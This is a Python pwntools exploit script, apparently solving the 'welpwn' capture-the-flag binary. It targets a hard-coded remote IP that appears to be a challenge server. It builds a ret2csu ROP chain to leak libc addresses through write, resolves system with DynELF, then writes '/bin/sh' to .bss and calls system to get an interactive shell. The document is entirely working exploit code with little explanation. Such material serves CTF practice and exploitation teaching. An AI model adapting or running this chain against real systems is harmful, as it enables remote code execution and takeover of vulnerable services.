#!/usr/bin/python
#coding=utf-8
from pwn import *
context.log_level='debug'
#p=remote("220.249.52.133",39936)
elf=ELF("./welpwn")
start_addr=0x400630 #start函数的地址
write_addr=elf.got['write']
read_addr=elf.got['read']
ppp1_addr=0x40089A	#.text:000000000040089A                 pop     rbx
									#.text:000000000040089B                 pop     rbp
									#.text:000000000040089C                 pop     r12
									#.text:000000000040089E                 pop     r13
									#.text:00000000004008A0                 pop     r14
									#.text:00000000004008A2                 pop     r15
									#.text:00000000004008A4                 retn
ppp2_addr=0x400880	#.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54j
									#.text:0000000000400880                 mov     rdx, r13
clean_addr=0x40089C	#.text:000000000040089C                 pop     r12
									#.text:000000000040089E                 pop     r13
									#.text:00000000004008A0                 pop     r14
									#.text:00000000004008A2                 pop     r15
									#.text:00000000004008A4                 ret

if args['DEBUG']:
    context.log_level = True 
elif args['REMOTE']: 
    p = remote('220.249.52.133', '56825')
else: 
    p= process('./welpwn')

def debug(addr1 = '0x40077A'):
    raw_input('debug')
    gdb.attach(p, "b * " + addr1)
debug()

def leak(addr):
	p.recv()
	payload='a'*24+p64(clean_addr)+p64(ppp1_addr)+p64(0)+p64(1)+p64(write_addr)+p64(8)+p64(addr)+p64(1)
	payload+=p64(ppp2_addr)+'a'*56+p64(start_addr)
	p.send(payload.ljust(1024,'a'))
	buff=p.recv(8)
	print(buff.encode('hex'))
	return buff 
dyn=DynELF(leak,elf=ELF("./welpwn"))
sys_addr=dyn.lookup("system","libc")
print("System addr:%X" % sys_addr)
def getshell():
	pop_rdi=0x4008A3
	payload='a'*24+p64(clean_addr)+p64(ppp1_addr)+p64(0)+p64(1)+p64(read_addr)+p64(8)+p64(elf.bss())+p64(0)
	payload+=p64(ppp2_addr)+'a'*56+p64(pop_rdi)+p64(elf.bss())+p64(sys_addr)+p64(0)
	p.recv()
	p.send(payload.ljust(1024,'a'))
	p.sendline("/bin/sh")
getshell()
p.interactive()